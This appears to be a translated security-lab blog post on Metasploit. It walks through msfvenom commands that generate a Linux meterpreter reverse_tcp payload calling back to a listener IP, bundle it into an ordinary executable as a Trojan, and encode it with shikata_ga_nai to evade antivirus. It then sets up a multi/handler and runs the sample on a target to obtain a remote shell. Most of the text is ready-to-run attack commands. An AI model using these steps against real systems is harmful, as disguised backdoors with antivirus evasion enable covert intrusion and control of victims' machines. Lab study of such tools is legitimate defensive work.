---
title: Testing Payloads with Metasploit
translation_id: metasploit-lab
source_digest: 2f6fbef5a259b77d543c96bd8c5941001bba01a11f7181666209c382b6228ad2
tags:
  - Metasploit
  - msfvenom
categories:
  - Cybersecurity
  - Security Labs
sections: {"generating-embedding-and-encoding-test-samples-with-msfvenom": "msfvenom-命令实现木马生成-捆绑以及免杀处理", "command-reference": "msfvenom-命令用法", "generating-a-sample": "木马生成", "embedding-a-sample": "木马捆绑", "detection-testing": "木马免杀", "observing-a-test-session-in-msfconsole": "msfconsole-木马利用", "controller": "攻击端", "target-server": "目标服务器"}
---

:::default
**Metasploit** is an open-source penetration testing framework used to discover, validate and exploit vulnerabilities.

The Kali environment used here came with Metasploit installed.
:::

## Generating, embedding and encoding test samples with msfvenom

**Introduction**

**msfvenom** is part of Metasploit.

It combines functions previously provided by msfpayload and msfencoder. It can generate a payload, encode it to avoid bad characters or try to evade antivirus detection, and bundle it with a host executable.

### Command reference

These were the options I used:

**-l** lists the available resources for a module type: payloads, encoders, nops, platforms, archs, encrypt, formats or all. The samples in this lab are under payloads.

**-p** selects a payload. A dash selects a custom payload from standard input.
To see a payload’s standard options, use `--list-options`.

**-f** selects the output format. Run `--list formats` to see the available formats.

**-o** sets the output file path. Shell redirection is another way to save the output.

**-x** supplies a custom executable template that the payload will be bundled with.

**-e** selects the encoder.

**-i** sets the number of encoding iterations.

### Generating a sample

1. I listed the available payloads with `msfvenom -l payloads`.
There were a lot of results, so I used grep to narrow them down by the features I wanted.
![image-20251214010221520](https://res.cloudinary.com/sycamore/image/upload/v1792696650/Typora/2025/12/ebeb726eacc7fad3302b80554fb13af1.png)
I used `linux/x86/meterpreter/reverse_tcp` as an example of a reverse connection.

2. I checked which options that payload needed:
`msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options`![image-20251214010409894](https://res.cloudinary.com/sycamore/image/upload/v1792696653/Typora/2025/12/874f3751e4961c5140e9e30ca40f22e7.png)




3. I listed the available output formats:
`msfvenom --list formats`![image-20251214010426398](https://res.cloudinary.com/sycamore/image/upload/v1792696655/Typora/2025/12/38ea1bb4d485262080541e030e6fc0a3.png)


4. Using that information, I put together the command to generate the sample:
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf`![image-20251214010433724](https://res.cloudinary.com/sycamore/image/upload/v1792696656/Typora/2025/12/09553b61c2c9d88fe78ede3ea742468a.png)


Here, **-p** selects **linux/x86/meterpreter/reverse_tcp**.
**LHOST** specifies the IP address of the listener the sample connects back to.
**LPORT** selects the port. Its default is 4444, so I could omit it here.
**-f** sets the output format to **elf**.
**-o** saves the output to **/root/payload.elf**.

### Embedding a sample

A Trojan can be bundled with an ordinary executable to help it spread.

For the host file I used `/root/hello_world`, a small C program I’d compiled with gcc.

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf`
![image-20251214010440843](https://res.cloudinary.com/sycamore/image/upload/v1792696660/Typora/2025/12/c7bc72a382ae694be589d6a5cb25a3de.png)


The **-x** option selects /root/hello_world as the template. The remaining arguments are the same as in the earlier generation command.

### Detection testing

For this part of the lab I tested whether encoding changed the antivirus result.

I listed the available encoders with `msfvenom -l encoders`.
![image-20251214010444808](https://res.cloudinary.com/sycamore/image/upload/v1792696666/Typora/2025/12/d9aa39a90db02fe251a93aff3dd31cb7.png)

I chose x86/shikata_ga_nai to see whether encoding would make the sample less likely to be detected.
My command was `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf`.
![image-20251214010449517](https://res.cloudinary.com/sycamore/image/upload/v1792696660/Typora/2025/12/9f32f881202e4a535bac4f5ce0f8c517.png)


**-e** selects x86/shikata_ga_nai.
**-i** sets the iteration count to five.
The number of iterations is adjustable. Adding more doesn’t necessarily improve the result and can stop the sample working.


## Observing a test session in msfconsole
The following experiment used the previously generated file **payload.elf**.

### Controller

I opened the MSF console with `msfconsole`.
![image-20251214010454524](https://res.cloudinary.com/sycamore/image/upload/v1792696667/Typora/2025/12/2c2e815f13d049741cd9371ace771daa.png)



I selected the handler with `use exploit/multi/handler`.

Then I ran `show options` to see which parameters still needed values.
![trojan-horse10](https://res.cloudinary.com/sycamore/image/upload/v1792696664/Typora/2025/12/4a6d04ee3788a771e9fe642e64fa8104.png)




I selected the payload with `set PAYLOAD linux/x86/meterpreter/reverse_tcp`.
I set the local host address with `set LHOST 192.168.158.132`.

Running `run` started the listener. When I ran the sample on the target server, the listener received a shell.
Here’s the result:
![image-20251214010500036](https://res.cloudinary.com/sycamore/image/upload/v1792696664/Typora/2025/12/8b2780434593170f1b8173cf9fa13836.png)

### Target server

I transferred the sample to the target server.

I made it executable with `chmod +x payload.elf`.

With the listener already running on the controller, I executed payload.elf:
![image-20251214010506608](https://res.cloudinary.com/sycamore/image/upload/v1792696668/Typora/2025/12/80d816c18312f780f743c4b82696c43f.png)


Putting the two sides together:
- Controller:
1. `msfconsole`
2. `use exploit/multi/handler`
3. `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
4.` set LHOST 192.168.158.132`
5. Start the listener with `run`.
- Target server:
1. Download the sample.
2. `chmod +x payload.elf`
3. `./payload.elf`
